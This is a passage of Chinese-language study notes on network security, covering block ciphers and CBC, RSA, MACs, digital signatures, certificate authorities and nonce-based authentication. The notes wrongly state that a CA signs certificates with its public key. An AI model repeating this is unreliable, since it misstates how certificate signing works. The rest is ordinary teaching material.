class="mojikumi-line-end">。</span></p>
<p>在 symmetric key system 中<span class="mojikumi-line-end">，</span><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>A</mi></msub><mo>=</mo><msub><mi>K</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">K_A = K_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span><span class="mojikumi-line-end">，</span>是保密的<span class="mojikumi-line-end">；</span>在 public key system 中<span class="mojikumi-line-end">，</span><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">K_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 是公开的<span class="mojikumi-line-end">，</span><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">K_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 是保密的<span class="mojikumi-line-end">。</span></p>
<h3 id="symmetric-key-cryptography" class="heading"><a href="#symmetric-key-cryptography" class="heading-anchor" aria-label="章节： Symmetric Key Cryptography" tabindex="-1"></a><span>Symmetric Key Cryptography</span></h3>
<p>在现代密码所使用的 block cipher 中<span class="mojikumi-line-end">，</span>plaintext 被划分为若干个 block<span class="mojikumi-line-end">，</span>例如在 AES 中每 128 bit 是一个 block<span class="mojikumi-line-end">，</span>cipher 会构建一个 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>128</mn></msup><mo>→</mo><msup><mn>2</mn><mn>128</mn></msup></mrow><annotation encoding="application/x-tex">2^{128} \to 2^{128}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">128</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">128</span></span></span></span></span></span></span></span></span></span></span></span></span> 的 plaintext 到 ciphertext 的一一对应<span class="mojikumi-line-end">，</span>而 key 用来生成这个对应关系<span class="mojikumi-line-end">，</span>AES 的 key length 可以是 128/192/256 bit<span class="mojikumi-line-end">。</span>太小的 block size / key length 会导致安全性不够<span class="mojikumi-line-end">；</span>将整个对应关系存下来 key 会过长<span class="mojikumi-line-end">，</span>所以只能用没那么长的 key 来生成对应关系<span class="mojikumi-line-end">；</span>太大的 block size / key length 可能会影响性能<span class="mojikumi-line-end">。</span></p>
<p>如果 plaintext 中有多个相同的 block<span class="mojikumi-line-end">，</span>它们对应的 ciphertext 也相同<span class="mojikumi-line-end">，</span>就会暴露出一定的信息<span class="mojikumi-line-end">。</span>为了避免这样的风险<span class="mojikumi-line-end">，</span>可以给每个 block 异或上一个随机数再加密<span class="mojikumi-line-end">。</span></p>
<p>如果真的每个 block 都独立地生成一个随机数<span class="mojikumi-line-end">，</span>则传输时需要附上这一堆随机数<span class="mojikumi-line-end">，</span>整个 message 的长度会翻倍<span class="mojikumi-line-end">。</span>所以实际上并不会这样做<span class="mojikumi-line-end">，</span>而是会使用称作 cipher block chaining (CBC) 的技术<span class="mojikumi-line-end">：</span>每条 message 只生成一个随机数<span class="mojikumi-line-end">，</span>称作 initialization vector (IV)<span class="mojikumi-line-end">，</span>记作 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">c_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span><span class="mojikumi-line-end">，</span>而 plaintext 的第一块记作 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">m_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span><span class="mojikumi-line-end">，</span>对 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>⊕</mo><msub><mi>m</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">c_{i-1} \oplus m_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 加密得到 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">c_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span><span class="mojikumi-line-end">，</span>即每个 block 异或的是上一个 block 的加密结果<span class="mojikumi-line-end">，</span>这样传输时的 overhead 就只有一个 block size 的 IV 了<span class="mojikumi-line-end">。</span></p>
<h3 id="public-key-encryption" class="heading"><a href="#public-key-encryption" class="heading-anchor" aria-label="章节： Public Key Encryption" tabindex="-1"></a><span>Public Key Encryption</span></h3>
<p>symmetric key cryptography 需要双方以某种方式事先做到共享 key<span class="mojikumi-line-end">，</span>而这本身就需要 secure communication<span class="mojikumi-line-end">。</span>以前这可以通过线下之类的方式进行<span class="mojikumi-line-end">，</span>而在网络中则需要另外的方式<span class="mojikumi-line-end">。</span></p>
<p>在 public key encryption 中<span class="mojikumi-line-end">，</span>接收方有一对 key<span class="mojikumi-line-end">，</span>public key 用来加密<span class="mojikumi-line-end">，</span>private key 用来解密<span class="mojikumi-line-end">。</span>public key 是公开的<span class="mojikumi-line-end">，</span>从而不需要事先依赖于 secure communication 进行 key exchange<span class="mojikumi-line-end">。</span></p>
<p>public key encryption 带来身份认证的问题<span class="mojikumi-line-end">：</span>在 symmetric key cryptography 中<span class="mojikumi-line-end">，</span>知道 key 隐含了身份<span class="mojikumi-line-end">，</span>但知道 public key 则不代表身份<span class="mojikumi-line-end">，</span>所以需要额外的机制来进行认证<span class="mojikumi-line-end">。</span></p>
<p>RSA 是目前最流行的 public key encryption algorithm:</p>
<ol>
<li>选两个大质数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="mojikumi-line-start">（</span>一般要达到 1024~4096 bit 长<span class="mojikumi-line-end">）</span></li>
<li>令 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">n = pq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span></span></span></span></span><span class="mojikumi-line-end">，</span><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">z = (p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></li>
<li>选一个比 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span> 小<span class="mojikumi-line-end">、</span>和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi></mrow><annotation encoding="application/x-tex">z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span></span> 互质的数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span></span></li>
<li>算出 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span></span> 的乘法逆元 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>z</mi></mrow><annotation encoding="application/x-tex">d = e^{-1} \bmod z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span></span></li>
<li>public key 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n, e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span><span class="mojikumi-line-end">，</span>private key 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n, d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span></span></span></span></span></li>
<li>encryption: 设 plaintext 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></span> (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>&#x3C;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m &#x3C; n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3C;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span>)<span class="mojikumi-line-end">，</span>则 ciphertext 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c = m^e \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span></li>
<li>decryption: <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m = c^d \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span></li>
</ol>
<p>RSA 的计算比 AES 慢<span class="mojikumi-line-end">，</span>为了性能<span class="mojikumi-line-end">，</span>通常会结合 symmetric key cryptography 一起使用<span class="mojikumi-line-end">：</span>每次生成一个用于 symmetric key cipher 的 session key<span class="mojikumi-line-end">，</span>通过 public key encryption 来进行 key exchange<span class="mojikumi-line-end">，</span>实际的通信则使用 symmetric key cipher<span class="mojikumi-line-end">。</span></p>
<p>RSA 的安全性依赖于大数分解的困难性<span class="mojikumi-line-end">，</span>这受到量子计算的挑战<span class="mojikumi-line-end">。</span></p>
<h2 id="message-integrity-and-digital-signatures" class="heading"><a href="#message-integrity-and-digital-signatures" class="heading-anchor" aria-label="章节： Message Integrity and Digital Signatures" tabindex="-1"></a><span>Message Integrity and Digital Signatures</span></h2>
<p>message integrity 即 sender 身份真实<span class="mojikumi-line-end">，</span>message 未遭篡改<span class="mojikumi-line-end">。</span></p>
<p>cryptographic hash function 在一般的 hash 的基础上要求难以构造 collision<span class="mojikumi-line-end">，</span>从而可以用来验证消息未被篡改<span class="mojikumi-line-end">。</span></p>
<p>可以用 message authentication code (MAC) 来验证 message integrity<span class="mojikumi-line-end">：</span>双方共享保密的 authentication key<span class="mojikumi-line-end">，</span>设 message 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></span><span class="mojikumi-line-end">，</span>cryptographic hash function 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi></mrow><annotation encoding="application/x-tex">H</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span></span></span></span></span><span class="mojikumi-line-end">，</span>最终传输的是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>H</mi><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m, H(m + s))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mclose">))</span></span></span></span></span><span class="mojikumi-line-start">（</span>具体实现可能有所不同<span class="mojikumi-line-end">，</span>例如 HMAC 会 hash 两次<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span>可以使用 public key encryption 或者其他方式来 exchange authentication key<span class="mojikumi-line-end">。</span>MAC 本身可以不涉及 encryption<span class="mojikumi-line-end">，</span>如果只需保证 message integrity 而不在意 confidentiality 则无需付出 encryption 的性能代价<span class="mojikumi-line-end">。</span></p>
<p>digital signature 相当于 MAC 的 <span class="mojikumi">“</span>public key 版本<span class="mojikumi">”</span><span class="mojikumi-line-end">，</span>可以用来验证 sender 的身份<span class="mojikumi-line-end">，</span>而验证者只需知道 public key<span class="mojikumi-line-end">，</span>可以保持 private key 的私密<span class="mojikumi-line-end">。</span>RSA 的 encryption 和 decryption 其实是可交换的<span class="mojikumi-line-end">，</span>即先 public key 再 private key 或者先 private key 再 public key 都可以得到原来的 plaintext<span class="mojikumi-line-end">。</span>digital signature 即使用 private key 进行<span class="mojikumi-line-start">“</span>加密<span class="mojikumi">”</span><span class="mojikumi-line-end">，</span>而使用 public key 进行<span class="mojikumi-line-start">“</span>解密<span class="mojikumi">”</span><span class="mojikumi-line-end">。</span>RSA 计算慢<span class="mojikumi-line-end">，</span>所以可以对 cryptographic hash 而非 message 本身计算 digital signature<span class="mojikumi-line-end">。</span></p>
<p>虽然 MAC 和 digital signature 功能有一定的类似<span class="mojikumi-line-end">，</span>但 MAC 可以完全不涉及 encryption<span class="mojikumi-line-end">，</span>digital signature 则依赖于 public key infrastructure (PKI)<span class="mojikumi-line-end">。</span></p>
<p>digital signature 验证的是 message 和 public key 的对应关系<span class="mojikumi-line-end">，</span>还需要额外的措施来保证 public key 和 entity (sender) 的对应关系<span class="mojikumi-line-end">。</span>certification authority (CA) 提供了这一服务<span class="mojikumi-line-end">，</span>通过某些手段认证 public key 和 entity 的对应关系<span class="mojikumi-line-end">，</span>并颁发 certificate<span class="mojikumi-line-end">，</span>certificate 包含 entity 和 public key 的相关信息<span class="mojikumi-line-start">（</span>以及有效期<span class="mojikumi-line-end">）</span>以及使用 CA 的 public key 对这些信息创建的 digital signature<span class="mojikumi-line-end">。</span>有了 certificate<span class="mojikumi-line-end">，</span>对 public key 和 entity 之间关联的信任取决于对 CA 的信任<span class="mojikumi-line-end">。</span></p>
<h2 id="end-point-authentication" class="heading"><a href="#end-point-authentication" class="heading-anchor" aria-label="章节： End-Point Authentication" tabindex="-1"></a><span>End-Point Authentication</span></h2>
<p>书上说了很多<span class="mojikumi-line-end">，</span>但感觉本质上就是<span class="mojikumi-line-end">，</span>Alice 要向 Bob 证明自己的身份<span class="mojikumi-line-end">，</span>则 Bob 提供一个一次性的随机数 <i>nonce</i><span class="mojikumi-line-end">，</span>Alice 通过某种方式<span class="mojikumi-line-start">（</span>例如 symmetric key cryptography / MAC<span class="mojikumi-line-end">）</span>发回 nonce 并保证 message integrity<span class="mojikumi-line-end">。</span>nonce 用来防止 playback attack<span class="mojikumi-line-end">。</span></p>
